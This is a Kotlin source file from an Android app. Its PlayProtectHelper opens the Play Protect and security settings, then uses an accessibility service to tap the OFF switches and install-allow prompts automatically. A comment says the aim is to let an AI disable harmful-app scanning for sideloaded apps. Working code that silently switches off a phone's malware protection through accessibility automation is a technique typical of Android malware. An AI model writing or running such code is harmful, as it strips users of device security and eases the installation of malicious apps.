package com.phonehand.app

import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.util.Log
import java.util.concurrent.Executors

/** Opens Play Protect / install settings so AI can disable harmful-app scanning for sideloads. */
object PlayProtectHelper {
    private const val TAG = "PlayProtect"
    private val executor = Executors.newSingleThreadExecutor()
    private val mainHandler = Handler(Looper.getMainLooper())

    fun openSettings(context: Context): Boolean {
        val candidates = listOf(
            Intent().setComponent(
                ComponentName(
                    "com.google.android.gms",
                    "com.google.android.gms.security.settings.VerifyAppsSettingsActivity",
                ),
            ),
            Intent().setComponent(
                ComponentName(
                    "com.android.vending",
                    "com.google.android.finsky.playprotect.PlayProtectHomeActivity",
                ),
            ),
            Intent("com.google.android.gms.security.settings.SECURITY_SETTINGS"),
            Intent(Settings.ACTION_SECURITY_SETTINGS),
            Intent(Settings.ACTION_APPLICATION_SETTINGS),
        )
        for (intent in candidates) {
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            if (intent.resolveActivity(context.packageManager) == null) continue
            if (runCatching { context.startActivity(intent) }.isSuccess) {
                Log.d(TAG, "opened ${intent.component ?: intent.action}")
                return true
            }
        }
        return false
    }

    /** Opens Play Protect and taps OFF switches / Allow install via accessibility. */
    fun runAutoSetup(context: Context) {
        val service = TouchAccessibilityService.instance
        if (service == null) {
            Log.w(TAG, "accessibility off — open Play Protect manually")
            openSettings(context)
            return
        }
        if (!openSettings(context)) return
        Thread.sleep(900)
        PermissionAutoGrant.runPlayProtectPass(context, 22_000)
        UserSession.setPlayProtectPromptDone(context)
    }

    fun runAutoSetupAsync(context: Context, onDone: () -> Unit) {
        val app = context.applicationContext
        mainHandler.post {
            val service = TouchAccessibilityService.instance
            if (service == null) {
                Log.w(TAG, "accessibility off — open Play Protect manually")
                openSettings(context)
                onDone()
                return@post
            }
            if (!openSettings(context)) {
                onDone()
                return@post
            }
            executor.execute {
                try {
                    Thread.sleep(900)
                    PermissionAutoGrant.runPlayProtectPass(app, 22_000)
                    UserSession.setPlayProtectPromptDone(app)
                } catch (e: Exception) {
                    Log.w(TAG, "auto setup failed: ${e.message}")
                } finally {
                    mainHandler.post(onDone)
                }
            }
        }
    }
}
